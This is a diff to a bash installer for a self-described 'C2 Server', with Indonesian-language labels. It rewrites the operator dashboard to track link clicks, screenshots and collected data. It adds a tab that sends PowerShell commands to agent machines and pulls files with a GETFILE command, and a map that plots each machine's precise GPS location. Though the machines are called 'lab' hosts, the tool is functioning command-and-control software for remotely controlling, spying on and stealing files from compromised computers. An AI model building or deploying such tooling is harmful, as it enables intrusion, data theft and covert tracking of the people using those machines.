@@ -12,6 +12,16 @@ else
     SUDO="sudo"
 fi
 
+INSTALL_DIR=""
+if command -v systemctl > /dev/null 2>&1 && [ -f /etc/systemd/system/c2-listener.service ]; then
+    INSTALL_DIR=$(sed -n 's/^WorkingDirectory=//p' /etc/systemd/system/c2-listener.service 2>/dev/null | head -n 1)
+fi
+if [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ]; then
+    echo " [*] Instalasi lama terdeteksi di: $INSTALL_DIR"
+    echo "     (menggunakan ulang folder itu agar selalu memakai versi terbaru)"
+    cd "$INSTALL_DIR" || echo " [!] Gagal pindah ke $INSTALL_DIR, lanjut di $(pwd)"
+fi
+
 echo "=================================================================="
 echo " [*] Initializing C2 Server Setup"
 echo "=================================================================="
@@ -51,7 +61,7 @@ from datetime import datetime
 PORT = int(os.environ.get("C2_PORT", "8080"))
 LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
 DASH_PASS = os.environ.get("C2_DASH_PASS", "")
-VERSION = "3"
+VERSION = "5"
 
 EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
 COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
@@ -284,114 +294,187 @@ DASHBOARD_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>C2 Monitor - Dashboard (v3)</title>
+<title>C2 Monitor - Dashboard (v5)</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <style>
-body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:#0f172a; color:#e2e8f0; margin:0; padding:24px; }
-h1 { font-size:20px; margin:0 0 4px; }
-h2 { font-size:15px; margin:0 0 4px; }
-.sub { color:#94a3b8; font-size:12px; margin-bottom:20px; }
-.stats { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:20px; }
-.card { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:14px 20px; min-width:120px; }
-.card .n { font-size:26px; font-weight:700; color:#38bdf8; }
-.card .l { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; }
-table { width:100%; border-collapse:collapse; background:#1e293b; border-radius:8px; overflow:hidden; }
-th, td { text-align:left; padding:10px 12px; font-size:13px; border-bottom:1px solid #334155; vertical-align:top; }
-th { background:#0b1220; color:#94a3b8; font-size:11px; text-transform:uppercase; }
-tr:hover td { background:#24324a; }
-.badge { padding:2px 8px; border-radius:999px; font-size:11px; white-space:nowrap; }
-.b-click { background:#3b2f0a; color:#facc15; }
-.b-data { background:#0f3a2e; color:#34d399; }
+:root { --bg:#0b1120; --panel:#111a2e; --border:#1f2b47; --text:#e5edf8; --muted:#8aa0bf; --accent:#38bdf8; --green:#34d399; --amber:#facc15; --purple:#c084fc; }
+* { box-sizing:border-box; }
+body { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; background:var(--bg); color:var(--text); margin:0; padding:0; }
+.topbar { display:flex; align-items:center; gap:14px; padding:16px 26px; border-bottom:1px solid var(--border); background:#0d1526; position:sticky; top:0; z-index:10; }
+.topbar h1 { font-size:17px; margin:0; letter-spacing:.02em; }
+.ver { font-size:10px; color:var(--muted); border:1px solid var(--border); border-radius:999px; padding:2px 8px; }
+.conn { margin-left:auto; font-size:11px; color:var(--muted); display:flex; align-items:center; gap:6px; }
+.dot { width:8px; height:8px; border-radius:50%; display:inline-block; }
+.dot.on { background:var(--green); box-shadow:0 0 6px var(--green); }
+.dot.off { background:#f87171; }
+.tabs { display:flex; gap:4px; padding:14px 26px 0; }
+.tab { background:transparent; border:1px solid var(--border); color:var(--muted); border-bottom:0; border-radius:8px 8px 0 0; padding:10px 18px; font:inherit; font-size:12px; cursor:pointer; }
+.tab.active { background:var(--panel); color:var(--text); border-color:#2b3a5e; }
+.content { padding:18px 26px 40px; }
+.panel { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:18px; margin-bottom:18px; }
+.stats { display:flex; gap:12px; flex-wrap:wrap; }
+.card { background:#131c33; border:1px solid var(--border); border-radius:10px; padding:12px 18px; min-width:110px; }
+.card .n { font-size:24px; font-weight:700; color:var(--accent); }
+.card .l { font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.06em; margin-top:2px; }
+table { width:100%; border-collapse:collapse; }
+th, td { text-align:left; padding:9px 12px; font-size:12.5px; border-bottom:1px solid var(--border); vertical-align:top; }
+th { background:#0d1526; color:var(--muted); font-size:10px; text-transform:uppercase; }
+tr:hover td { background:#16203a; }
+.badge { padding:2px 8px; border-radius:999px; font-size:10.5px; white-space:nowrap; }
+.b-click { background:#3b2f0a; color:var(--amber); }
+.b-data { background:#0f3a2e; color:var(--green); }
 .b-shot { background:#3b1457; color:#e879f9; }
-.b-gps { background:#0a3d5c; color:#38bdf8; }
-.b-result { background:#2d1050; color:#c084fc; }
-.detail { max-width:420px; word-break:break-all; color:#cbd5e1; font-size:12px; }
-a { color:#38bdf8; }
-b { color:#c084fc; }
-hr { border:0; border-top:1px solid #334155; margin:28px 0; }
-.remote { display:flex; gap:20px; flex-wrap:wrap; align-items:flex-start; }
-.remote .panel { background:#1e293b; border:1px solid #334155; border-radius:8px; padding:18px; }
-.remote .left { flex:1; min-width:280px; }
-.remote .right { flex:2; min-width:340px; }
-label { font-size:11px; color:#94a3b8; text-transform:uppercase; letter-spacing:.06em; display:block; margin:12px 0 4px; }
-input[type=text], textarea { width:100%; background:#0b1220; color:#e2e8f0; border:1px solid #334155; border-radius:6px; padding:10px; font:13px ui-monospace, Menlo, monospace; box-sizing:border-box; }
-textarea { min-height:110px; resize:vertical; }
-button { background:#38bdf8; color:#0f172a; border:0; border-radius:6px; padding:10px 18px; font-weight:700; cursor:pointer; margin-top:12px; }
-button:hover { background:#7dd3fc; }
-.q { display:inline-block; background:#0b1220; border:1px solid #334155; color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:11px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
-.q:hover { background:#1e293b; }
-pre { background:#0b1220; border:1px solid #334155; border-radius:6px; padding:10px; font-size:12px; overflow:auto; max-height:240px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
+.b-gps { background:#0a3d5c; color:var(--accent); }
+.b-result { background:#2d1050; color:var(--purple); }
+.detail { max-width:400px; word-break:break-all; color:#c7d6ea; font-size:11.5px; }
+.muted { color:var(--muted); font-size:11.5px; }
+a { color:var(--accent); }
+b { color:var(--purple); }
+label { font-size:10px; color:var(--muted); text-transform:uppercase; letter-spacing:.06em; display:block; margin:14px 0 5px; }
+input[type=text], select, textarea { width:100%; background:#0b1220; color:var(--text); border:1px solid var(--border); border-radius:7px; padding:10px; font:12.5px ui-monospace, Menlo, monospace; }
+textarea { min-height:104px; resize:vertical; }
+select { cursor:pointer; }
+button.send { background:var(--accent); color:#0b1120; border:0; border-radius:7px; padding:11px 20px; font-weight:700; font-size:13px; cursor:pointer; margin-top:12px; width:100%; }
+button.send:hover { background:#7dd3fc; }
+.q { display:inline-block; background:#0b1220; border:1px solid var(--border); color:#7dd3fc; border-radius:999px; padding:4px 10px; font-size:10.5px; cursor:pointer; margin:6px 4px 0 0; white-space:nowrap; }
+.q:hover { background:#16203a; }
+pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; padding:9px; font-size:11.5px; overflow:auto; max-height:220px; white-space:pre-wrap; word-break:break-all; margin:6px 0 0; }
+.mbar { display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:4px; }
+.mid { font-size:13px; font-weight:600; }
+.minfo { font-size:11.5px; color:var(--muted); margin-top:8px; line-height:1.6; }
+#map { height:520px; border-radius:10px; margin-top:12px; z-index:1; }
+.leaflet-container { background:#0d1526; font:inherit; }
+.grid2 { display:grid; grid-template-columns:380px 1fr; gap:18px; align-items:start; }
+@media (max-width:900px){ .grid2 { grid-template-columns:1fr; } .tabs { padding-left:14px; } .content { padding:14px; } }
 </style>
 </head>
 <body>
-<h1>C2 Monitor <span style="font-size:12px;color:#94a3b8">v3</span></h1>
-<div class="sub" id="sub">Memuat...</div>
-<div class="stats">
-<div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
-<div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
-<div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
-<div class="card"><div class="n" id="sShot">0</div><div class="l">Screenshot</div></div>
-<div class="card"><div class="n" id="sIP">0</div><div class="l">IP Unik</div></div>
-<div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
+<div class="topbar">
+  <h1>C2 Monitor</h1><span class="ver">v5</span>
+  <div class="conn"><span class="dot off" id="connDot"></span><span id="connTxt">Menghubungkan...</span></div>
 </div>
-<table>
-<thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID</th><th>Lokasi</th><th>Detail</th></tr></thead>
-<tbody id="rows"></tbody>
-</table>
-<div class="sub" style="margin-top:16px">Auto-refresh 3 detik. Menampilkan 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>
-
-<hr>
-<h2 id="remote">Remote Access - Isi Mesin Lab</h2>
-<div class="sub">Agent menjalankan perintah di PowerShell mesin lab. Format khusus: <b>GETFILE C:\path\file</b> untuk mengunduh file ke server.</div>
-<div class="remote">
-<div class="panel left">
-  <label>ID Mesin</label>
-  <input type="text" id="machine" value="win-lab-1">
-  <label>Perintah (PowerShell)</label>
-  <textarea id="cmd" placeholder="whoami"></textarea>
-  <div>
-    <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
-    <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
-    <span class="q">systeminfo</span>
-    <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
+<div class="tabs">
+  <button class="tab active" data-tab="mon" onclick="showTab('mon')">Monitoring</button>
+  <button class="tab" data-tab="rem" onclick="showTab('rem')">Remote Access</button>
+  <button class="tab" data-tab="map" onclick="showTab('map')">Peta</button>
+</div>
+<div class="content">
+<div id="tab-mon">
+  <div class="panel">
+    <div class="stats">
+      <div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
+      <div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
+      <div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
+      <div class="card"><div class="n" id="sShot">0</div><div class="l">Screenshot</div></div>
+      <div class="card"><div class="n" id="sMach">0</div><div class="l">Mesin Terdeteksi</div></div>
+      <div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
+    </div>
   </div>
-  <button onclick="sendCmd()">Kirim Perintah</button>
-  <div class="sub" id="status" style="margin-top:10px"></div>
+  <div class="panel">
+    <table>
+      <thead><tr><th>Waktu</th><th>Jenis</th><th>IP</th><th>ID Mesin</th><th>Lokasi</th><th>Detail</th></tr></thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="muted" style="margin-top:12px">Auto-refresh 3 detik - 100 event terbaru. <a id="exportLink" href="/export">Export semua log</a></div>
+  </div>
 </div>
-<div class="panel right">
-  <label>Hasil Perintah</label>
-  <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
+<div id="tab-rem" style="display:none">
+  <div class="panel">
+    <div class="mbar"><span class="mid" id="mName">Belum ada mesin</span><span id="mStatus"></span></div>
+    <div class="minfo" id="mInfo">Jalankan agent_windows.ps1 di mesin lab. Saat lokasi (GPS) terdeteksi, mesin otomatis terpilih di sini.</div>
+  </div>
+  <div class="grid2">
+    <div class="panel">
+      <label>Target Mesin</label>
+      <select id="machine"></select>
+      <label>Perintah (PowerShell)</label>
+      <textarea id="cmd" placeholder="whoami"></textarea>
+      <div>
+        <span class="q">whoami</span><span class="q">ipconfig</span><span class="q">dir C:\</span>
+        <span class="q">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</span>
+        <span class="q">systeminfo</span>
+        <span class="q">GETFILE C:\Users\lab\Desktop\catatan.txt</span>
+      </div>
+      <button class="send" onclick="sendCmd()">Kirim Perintah</button>
+      <div class="muted" id="status" style="margin-top:10px"></div>
+    </div>
+    <div class="panel">
+      <label>Hasil Perintah</label>
+      <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
+    </div>
+  </div>
+</div>
+<div id="tab-map" style="display:none">
+  <div class="panel">
+    <div class="mbar"><span class="mid">Peta Lokasi Mesin (OpenStreetMap)</span><span class="muted" id="mapInfo"></span></div>
+    <div id="map"></div>
+    <div class="minfo">Marker = titik koordinat GPS presisi dari mesin lab. Klik marker untuk melihat alamat & koordinat. Data diambil dari event GPS, bukan IP (IP hanya menunjukkan lokasi provider).</div>
+  </div>
 </div>
 </div>
-
 <script>
 var Q = location.search;
+var autoSel = null;
 function esc(s) {
     return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
         return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
     });
 }
+function showTab(name) {
+    document.getElementById("tab-mon").style.display = name === "mon" ? "block" : "none";
+    document.getElementById("tab-rem").style.display = name === "rem" ? "block" : "none";
+    document.getElementById("tab-map").style.display = name === "map" ? "block" : "none";
+    document.querySelectorAll(".tab").forEach(function(b) { b.classList.toggle("active", b.dataset.tab === name); });
+    if (name === "map" && LMap) setTimeout(function() { LMap.invalidateSize(); }, 60);
+}
+function toDate(s) { return new Date(s.replace(" ", "T")); }
+function machineInfo(ev) {
+    var seen = {}, arr = [];
+    for (var i = 0; i < ev.length; i++) {
+        var e = ev[i];
+        if (e.id && e.id !== "-" && e.id !== "beacon" && !seen[e.id]) {
+            seen[e.id] = 1;
+            var gps = null, glat = null, glon = null;
+            for (var k = 0; k < ev.length; k++) {
+                var g = ev[k];
+                if (g.type === "gps" && g.detail && g.detail.machine === e.id) {
+                    if (!gps && g.detail.address) gps = g.detail.address;
+                    if (g.detail.lat != null && glat == null) { glat = Number(g.detail.lat); glon = Number(g.detail.lon); }
+                }
+            }
+            arr.push({ id: e.id, time: e.time, loc: e.location, gps: gps, lat: glat, lon: glon });
+        }
+    }
+    return arr;
+}
 async function refresh() {
     try {
         var r = await fetch("/api/events" + Q);
-        if (!r.ok) { document.getElementById("sub").textContent = "Akses ditolak / pass salah"; return; }
+        if (!r.ok) {
+            document.getElementById("connTxt").textContent = "Akses ditolak (pass salah)";
+            document.getElementById("connDot").className = "dot off";
+            return;
+        }
         var ev = await r.json();
+        document.getElementById("connDot").className = "dot on";
+        document.getElementById("connTxt").textContent = "Terkoneksi - " + ev.length + " event";
         render(ev);
-    } catch(e) { document.getElementById("sub").textContent = "Server belum merespon..."; }
+    } catch(e) {
+        document.getElementById("connTxt").textContent = "Server belum merespon...";
+    }
 }
 function render(ev) {
-    document.getElementById("sub").textContent = "Terkoneksi - " + ev.length + " event";
-    document.getElementById("sTotal").textContent = ev.length;
-    var clicks = 0, datas = 0, shots = 0, ips = {}, last = ev.length ? ev[0].time : "-";
+    var clicks = 0, datas = 0, shots = 0, last = ev.length ? ev[0].time : "-";
     for (var i = 0; i < ev.length; i++) {
         if (ev[i].type === "click") clicks++;
         else if (ev[i].type === "screenshot") shots++;
         else datas++;
-        ips[ev[i].ip] = 1;
     }
+    document.getElementById("sTotal").textContent = ev.length;
     document.getElementById("sClick").textContent = clicks;
     document.getElementById("sData").textContent = datas;
     document.getElementById("sShot").textContent = shots;
-    document.getElementById("sIP").textContent = Object.keys(ips).length;
     document.getElementById("sLast").textContent = last;
     var rows = document.getElementById("rows");
     rows.innerHTML = "";
@@ -405,7 +488,9 @@ function render(ev) {
         } else if (e.type === "gps") {
             badge = '<span class="badge b-gps">GPS</span>';
             var acc = e.detail && e.detail.accuracy != null ? " (~" + e.detail.accuracy + "m)" : "";
-            detail = esc(e.detail.address || (e.detail.lat + ", " + e.detail.lon)) + acc;
+            var coords = "";
+            if (e.detail && e.detail.lat != null) coords = " (" + Number(e.detail.lat).toFixed(6) + ", " + Number(e.detail.lon).toFixed(6) + ")";
+            detail = esc(e.detail.address || (e.detail.lat + ", " + e.detail.lon)) + coords + acc;
         } else if (e.type === "screenshot") {
             badge = '<span class="badge b-shot">Screenshot</span>';
             var kb = e.detail && e.detail.size_kb != null ? e.detail.size_kb + " KB" : "";
@@ -435,6 +520,98 @@ function render(ev) {
         tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
         cmdRows.appendChild(tr);
     }
+    syncMachines(ev);
+    updateMap(ev);
+}
+function syncMachines(ev) {
+    var arr = machineInfo(ev);
+    document.getElementById("sMach").textContent = arr.length;
+    var sel = document.getElementById("machine");
+    var cur = sel.value;
+    arr.forEach(function(m) {
+        var exists = false;
+        for (var i = 0; i < sel.options.length; i++) {
+            if (sel.options[i].value === m.id) { exists = true; break; }
+        }
+        if (!exists) {
+            var o = document.createElement("option");
+            o.value = m.id; o.textContent = m.id;
+            sel.appendChild(o);
+        }
+    });
+    if (!arr.length) {
+        document.getElementById("mName").textContent = "Belum ada mesin";
+        document.getElementById("mStatus").textContent = "";
+        document.getElementById("mInfo").textContent = "Jalankan agent_windows.ps1 di mesin lab. Saat lokasi (GPS) terdeteksi, mesin otomatis terpilih di sini.";
+        return;
+    }
+    var latest = arr[0];
+    if (cur === "" || cur === autoSel || (autoSel !== latest.id && cur === autoSel)) {
+        sel.value = latest.id;
+        autoSel = latest.id;
+    }
+    var m = arr.filter(function(x) { return x.id === sel.value; })[0] || latest;
+    renderMachine(m);
+}
+function renderMachine(m) {
+    document.getElementById("mName").textContent = m.id;
+    var age = (new Date() - toDate(m.time)) / 1000;
+    var online = age < 90;
+    document.getElementById("mStatus").innerHTML = online
+        ? '<span class="badge b-data">ONLINE</span>'
+        : '<span class="badge b-click">TIDAK AKTIF</span>';
+    var loc = (m.gps ? m.gps : m.loc) + (m.gps ? " (GPS)" : "");
+    if (m.lat != null) loc += " <span class='muted'>(" + m.lat.toFixed(6) + ", " + m.lon.toFixed(6) + ")</span>";
+    document.getElementById("mInfo").innerHTML = "Terakhir terlihat: <b>" + esc(m.time) + "</b><br>Lokasi: <b>" + esc(loc) + "</b>";
+}
+var LMap = null, markers = {}, mapCenter = null;
+function initMap() {
+    if (!window.L) return;
+    LMap = L.map("map").setView([-2.5, 118], 5);
+    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        maxZoom: 19,
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+    }).addTo(LMap);
+}
+function machineLocations(ev) {
+    var got = {}, seen = {};
+    for (var i = 0; i < ev.length; i++) {
+        var e = ev[i];
+        if (e.type === "gps" && e.detail && e.detail.lat != null && e.detail.lon != null) {
+            var key = e.id || e.ip;
+            if (!seen[key]) {
+                seen[key] = 1;
+                got[key] = { id: key, ip: e.ip, lat: Number(e.detail.lat), lon: Number(e.detail.lon), addr: e.detail.address || e.location, time: e.time };
+            }
+        }
+    }
+    return got;
+}
+function updateMap(ev) {
+    if (!LMap) return;
+    var got = machineLocations(ev);
+    for (var k in markers) if (!got[k]) { LMap.removeLayer(markers[k]); delete markers[k]; }
+    for (var k2 in got) {
+        var g = got[k2];
+        var popup = "<b>" + esc(g.id) + "</b><br>" + esc(g.addr) + "<br><i>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</i><br>" + esc(g.time);
+        if (markers[k2]) {
+            var mk = markers[k2];
+            mk.setLatLng([g.lat, g.lon]);
+            mk.bindPopup(popup);
+        } else {
+            markers[k2] = L.marker([g.lat, g.lon]).addTo(LMap).bindPopup(popup);
+        }
+    }
+    var keys = Object.keys(got);
+    if (keys.length) {
+        var latest = got[keys[0]];
+        if (!mapCenter || mapCenter[0] !== latest.lat || mapCenter[1] !== latest.lon) {
+            mapCenter = [latest.lat, latest.lon];
+            var z = LMap.getZoom();
+            LMap.setView([latest.lat, latest.lon], z >= 14 ? z : 14);
+        }
+    }
+    document.getElementById("mapInfo").textContent = keys.length ? keys.length + " titik terpetakan" : "Belum ada titik GPS";
 }
 document.getElementById("exportLink").href = "/export" + Q;
 document.querySelectorAll(".q").forEach(function(el) {
@@ -453,6 +630,7 @@ async function sendCmd() {
     } catch(e) { st.textContent = "Server tidak merespon."; }
 }
 refresh();
+initMap();
 setInterval(refresh, 3000);
 </script>
 </body>
@@ -785,6 +963,8 @@ EOF
 
 chmod +x "$SCRIPT_NAME"
 echo " [+] Listener script generated and made executable."
+echo " [+] Versi terpasang: $(sed -n 's/^VERSION = //p' "$SCRIPT_NAME" | head -n 1)"
+echo " [+] File $SCRIPT_NAME ditulis ulang - menimpa versi lama."
 
 echo " [*] Opening port $PORT in firewall..."
 open_port() {
